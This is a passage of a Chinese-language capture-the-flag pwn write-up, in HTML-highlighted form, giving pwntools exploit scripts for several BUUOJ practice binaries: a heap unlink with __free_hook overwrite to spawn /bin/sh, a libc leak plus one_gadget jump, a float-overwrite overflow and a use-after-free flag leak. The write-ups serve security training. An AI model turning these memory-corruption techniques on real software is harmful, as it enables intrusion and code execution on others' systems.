class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Enter a size:\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Enter the content: \\n'</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>content<span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span>size<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Enter an index:\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Enter an index:\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Enter the content: \\n'</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>key <span class=\"token operator\">=</span> <span class=\"token number\">0x202040</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>notelist <span class=\"token operator\">=</span> <span class=\"token number\">0x202060</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>strind <span class=\"token operator\">=</span> <span class=\"token number\">7.5</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>lsmind <span class=\"token operator\">=</span> <span class=\"token number\">15</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>mainind <span class=\"token operator\">=</span> <span class=\"token number\">11</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>banner <span class=\"token operator\">=</span> <span class=\"token number\">0xb42</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'%11$p,%15$p'</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'name:'</span><span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Hello, '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>main_a <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b','</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>lsm_ <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'main:'</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>main_a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'lsm:'</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>lsm_<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>notelist <span class=\"token operator\">+=</span> main_a <span class=\"token operator\">-</span> <span class=\"token number\">0x1186</span> </pre></td></tr><tr><td data-num=\"58\"></td><td><pre>lsm_a <span class=\"token operator\">=</span> lsm_ <span class=\"token operator\">-</span> <span class=\"token number\">240</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>obj <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">,</span> lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>libcbase <span class=\"token operator\">=</span> lsm_a <span class=\"token operator\">-</span> obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>fh_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span>  obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'__free_hook'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>sys_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x88</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'aa'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x88</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'aa'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x88</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'aa'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x88</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'/bin/sh\\0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>c1i <span class=\"token operator\">=</span> notelist <span class=\"token operator\">+</span> <span class=\"token number\">0x10</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>payload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x81</span><span class=\"token punctuation\">,</span> c1i<span class=\"token operator\">-</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> c1i<span class=\"token operator\">-</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">[</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p8<span class=\"token punctuation\">(</span><span class=\"token number\">0x90</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span>fh_a<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'\\x80\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>sys_a<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"oneshot_tjctf_2016\"><a class=\"markdownIt-Anchor\" href=\"#oneshot_tjctf_2016\">#</a> oneshot_tjctf_2016</h1>\n<p>** 考点：**one_gadget</p>\n<p>拥有一次读取任意地址内容和跳转到任意地址的机会。</p>\n<p>读取任意 libc 函数泄露 libc 地址，然后跳转到 one_gadget。</p>\n<p>libc 版本读取后为 <code>libc6_2.23-0ubuntu10_amd64</code> 。</p>\n<p><img data-src=\"./image-20231118224655913.png\" alt=\"image-20231118224655913\"></p>\n<p>对对应文件执行 <code>one_gadget</code>  查询。</p>\n<p><img data-src=\"./image-20231118224844697.png\" alt=\"image-20231118224844697\"></p>\n<p>执行跳转前程序将 eax 寄存器清零，因此直接选择第一个 one_gadget。</p>\n<p><img data-src=\"./image-20231118224910215.png\" alt=\"image-20231118224910215\"></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher3 <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./oneshot_tjctf_2016'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#p=process('./oneshot_tjctf_2016')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">26936</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b __isoc99_scanf')</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>lsm_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Read location?'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>lsm_g<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Value: '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>lsm_a <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>obj <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">,</span> lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>libcbase <span class=\"token operator\">=</span> lsm_a <span class=\"token operator\">-</span>obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"18\"></td><td><pre>onegad <span class=\"token operator\">=</span> <span class=\"token number\">0x45216</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>onegad <span class=\"token operator\">+=</span> libcbase</pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Jump location?'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>onegad<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"./image-20231118224956769.png\" alt=\"image-20231118224956769\"></p>\n<h1 id=\"护网杯_2018_gettingstart\"><a class=\"markdownIt-Anchor\" href=\"#护网杯_2018_gettingstart\">#</a> 护网杯_2018_gettingstart</h1>\n<p>** 考点：** 浮点数储存</p>\n<p>查看汇编找到浮点数对应的十六进制，缓冲区溢出将对应变量覆盖为对应值。</p>\n<p><img data-src=\"./image-20231119000514776.png\" alt=\"image-20231119000514776\"></p>\n<p><img data-src=\"./image-20231119000436805.png\" alt=\"image-20231119000436805\"></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token string\">'2018_gettingStart'</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">\"./\"</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">26360</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>fl <span class=\"token operator\">=</span> <span class=\"token number\">0x3FB999999999999A</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>num <span class=\"token operator\">=</span> <span class=\"token number\">0x7FFFFFFFFFFFFFFF</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">[</span>num<span class=\"token punctuation\">,</span> fl<span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"./image-20231119000719983.png\" alt=\"image-20231119000719983\"></p>\n<h1 id=\"gyctf_2020_some_thing_exceting\"><a class=\"markdownIt-Anchor\" href=\"#gyctf_2020_some_thing_exceting\">#</a> gyctf_2020_some_thing_exceting</h1>\n<p>** 考点：**heap, uaf</p>\n<p>**libc 版本：**libc6_2.23</p>\n<p>未开启 PIE。</p>\n<p><img data-src=\"./image-20231119001138545.png\" alt=\"image-20231119001138545\"></p>\n<p>程序开始将 flag 放在.bss 段上。</p>\n<p><img data-src=\"./image-20231119001154173.png\" alt=\"image-20231119001154173\"></p>\n<p>free 后不清空地址，块管理块模式。</p>\n<p>对某个 0x10 管理块释放后分配为用户块，将 flag 的地址填入，然后输出。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token string\">'gyctf_2020_some_thing_exceting'</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>libcfile <span class=\"token operator\">=</span> <span class=\"token string\">'/home/walt/share/pwn/libc/libc6_2.23-0ubuntu10_amd64/libc/lib/x86_64-linux-gnu/libc-2.23.so'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libcfile<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28272</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">'b '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">choose</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'> '</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">mal</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">,</span> size1<span class=\"token punctuation\">,</span> content1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># one time two malloc</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b\"> ba's length : \"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'> ba : '</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b\"> na's length : \"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'> na : '</span><span class=\"token punctuation\">,</span> content1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'> Banana ID : '</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dump</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'> SCP project ID : '</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token number\">0x6020A8</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x28</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token 